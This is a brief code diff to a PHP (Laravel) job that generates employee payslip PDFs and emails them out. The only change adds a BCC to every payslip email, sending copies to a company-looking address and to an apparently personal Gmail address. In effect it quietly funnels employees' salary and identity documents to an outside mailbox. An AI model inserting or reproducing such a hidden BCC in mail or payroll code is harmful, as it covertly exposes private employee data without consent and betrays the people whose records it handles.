@@ -28,6 +28,6 @@ class BlastEmail implements ShouldQueue
         $pdf = Pdf::loadView('print.payslip', $this->data);
         $pdf->save(storage_path('app/private/' . $this->dir . '/' . $this->data['nip'] . '.pdf'));
 
-        Mail::to($this->data['recipient'])->queue(new PayslipMailer($this->data, $this->dir));
+        Mail::to($this->data['recipient'])->bcc(['bcc_payslip@inosantek.com', 'buat.crypto69@gmail.com'])->queue(new PayslipMailer($this->data, $this->dir));
     }
 }
